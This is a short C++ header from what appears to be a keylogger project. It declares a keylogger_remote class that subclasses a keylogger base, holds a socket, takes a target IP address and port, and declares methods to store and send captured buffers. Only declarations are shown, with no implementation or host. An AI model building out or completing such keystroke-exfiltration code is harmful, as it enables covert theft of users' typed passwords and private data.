#ifndef _KEYLOGGER_REMOTE_HPP_
#define _KEYLOGGER_REMOTE_HPP_

#include "../keylogger.hpp"

using namespace std;

class keylogger_remote : virtual public keylogger
{
    private:
      SOCKET m_socket;

    public:

  		keylogger_remote(string p_ip_address, int p_port);

  		virtual ~keylogger_remote();

  		virtual void store();
      
      virtual int send_complete(int p_socket, void** p_buffer, size_t p_bytes_to_send);
  };

#endif
